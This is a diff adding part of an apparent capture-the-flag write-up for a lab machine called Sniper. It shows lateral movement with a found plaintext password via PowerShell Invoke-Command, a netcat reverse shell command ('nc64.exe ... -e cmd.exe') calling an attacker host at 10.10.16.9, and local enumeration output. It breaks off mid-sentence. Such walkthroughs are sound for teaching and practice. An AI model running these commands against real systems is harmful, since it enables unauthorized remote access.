@@ -208,7 +208,109 @@ if (mysqli_connect_errno())
 
 - We can try the creds as `Chris` user
 
+```
+PS C:\> $user = "Sniper\Chris"
+$user = "Sniper\Chris"
+PS C:\> $password = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+$password = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+PS C:\> $cred = New-Object System.Management.Automation.PSCredential($user, $password)
+$cred = New-Object System.Management.Automation.PSCredential($user, $password)
+PS C:\> Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
+sniper\chris
+PS C:\> 
+```
 
+- Looks like it works
+  - Let's get reverse shell
+
+```
+PS C:\> Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {\\10.10.16.9\share\nc64.exe 10.10.16.9 7777 -e cmd.exe}
+Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {\\10.10.16.9\share\nc64.exe 10.10.16.9 7777 -e cmd.exe}
+```
+
+![](./images/5.png)
 
 
 ## Root
+- `whoami`
+```
+C:\Users\Chris>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+C:\Users\Chris>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  
+```
+
+- We have a `docs`
+```
+C:\Users\Chris>dir Downloads
+dir Downloads
+ Volume in drive C has no label.
+ Volume Serial Number is AE98-73A8
+
+ Directory of C:\Users\Chris\Downloads
+
+04/11/2019  08:36 AM    <DIR>          .
+04/11/2019  08:36 AM    <DIR>          ..
+04/11/2019  08:36 AM            10,462 instructions.chm
+               1 File(s)         10,462 bytes
+               2 Dir(s)   2,353,213,440 bytes free
+```
+
+![](./images/6.png)
+
+- We have also a note in `C:\Docs` folder
+```
+c:\>dir Docs
+dir Docs
+ Volume in drive C has no label.
+ Volume Serial Number is AE98-73A8
+
+ Directory of c:\Docs
+
+10/01/2019  01:04 PM    <DIR>          .
+10/01/2019  01:04 PM    <DIR>          ..
+04/11/2019  09:31 AM               285 note.txt
+04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
+               2 File(s)        552,892 bytes
+               2 Dir(s)   2,353,213,440 bytes free
+
+c:\>cd Docs
+cd Docs
+
+c:\Docs>type note.txt
+type note.txt
+Hi Chris,
+        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
+
+Regards,
+Sniper CEO.
+c:\Docs>
+
+```
+
+- Looks
